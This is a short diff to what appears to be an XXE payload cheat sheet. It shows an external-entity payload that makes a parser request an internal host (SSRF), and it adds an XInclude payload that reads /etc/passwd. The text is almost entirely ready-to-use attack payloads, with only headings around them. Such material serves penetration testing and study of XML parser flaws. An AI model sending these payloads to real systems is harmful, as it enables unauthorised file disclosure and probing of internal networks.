@@ -11,3 +11,10 @@ XXE to SSRF
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
+
+XXE via XInclude attacks
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
